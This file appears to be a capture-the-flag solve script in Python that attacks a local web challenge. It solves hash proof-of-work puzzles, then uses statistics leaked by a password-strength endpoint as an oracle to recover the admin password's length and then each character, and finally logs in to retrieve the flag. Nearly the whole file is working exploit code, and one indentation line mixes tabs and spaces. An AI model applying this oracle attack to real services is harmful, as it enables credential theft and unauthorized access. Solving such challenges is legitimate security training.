#!/usr/bin/env python

from pwn import *
import sys, pprint
import hashlib, random, string, requests

baseurl = "http://localhost:8000"
pwmeterhashprefix = "1337"
loginhashsuffix = "66666"

def mkstr(N):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(N))

def makeguess(m):
    proof = mkstr(10)
    fullstr = m + proof
    return (proof, hashlib.sha256(fullstr.encode("utf8")).hexdigest())

def passwordList():
    r = requests.get("{}/static/public.password.list".format(baseurl))
    if r.status_code == 200:
        return [x for x in r.text.split("\n") if x != ""]
    
    pprint.pprint(r.json())
    raise Exception("unexpected error code")

def pwmeterResult(word, t=None):
    def pwmeterProof(word):
        while True:
            (proof, h) = makeguess(word)
            offset = int(h[-2:], 16)
            if len(word) < 5:
                modulo = 13 + len(word)
            else:
                modulo = 18
            # we want to check for particular hints...
            substrindex = modulo - 4
            lengthindex = 4

            checkindex = None
            if t == "substring":
                checkindex = substrindex
            elif t == "length":
                checkindex = lengthindex

            if h.startswith(pwmeterhashprefix) and (checkindex == None or offset % modulo == checkindex):
                return proof

    r = requests.get("{}/pwmeter/{}/{}".format(baseurl, word, pwmeterProof(word)))
    if r.status_code == 200:
        return r.json()
    
    pprint.pprint(r.json())
    raise Exception("unexpected error code")

def loginResult(word):
    def loginProof(word):
        while True:
            (proof, h) = makeguess(word)
            if h.endswith(loginhashsuffix):
                return proof

    r = requests.get("{}/login/{}/{}".format(baseurl, word, loginProof(word)))
    if r.status_code == 200:
        return r.json()
    
    pprint.pprint(r.json())
    raise Exception("unexpected error code")
        


if __name__ == "__main__":
    knownpasswords = passwordList()
    pwlength = None
    i = 0
    # step 1: determine password length
    p = log.progress('Determining admin password length')
    while pwlength == None:
        i += 1
        p.status("Trying {}".format(i))
        cpw = "A"*i
        x = len([x for x in knownpasswords if len(x) == i])
        res = pwmeterResult(cpw, t="length")
        y = int(res["analysis"].split(" ")[7])
        if x != y:
            pwlength = i
            p.success("It's {}".format(pwlength))

    # step 2: find the password
    currpassword = ""
    charset = string.ascii_letters + string.digits
    p = log.progress('Determining admin password')
    while len(currpassword) != pwlength:
        for c in charset:
            testpw = c + currpassword
	    p.status("Found suffix \"{}\", trying prefix character {}: \"{}\"".format(currpassword, c, testpw))
            x = len([x for x in knownpasswords if x.endswith(testpw)])
            res = pwmeterResult(testpw, t="substring")
            y = int(res["analysis"].split(" ")[0])
            if x != y:
                currpassword = testpw
                break
    p.success("It's {}".format(currpassword))
            
    # step 3: login and get the flag
    p = log.progress('Retrieving flag')
    res = loginResult(currpassword)
    p.success(res["flag"])








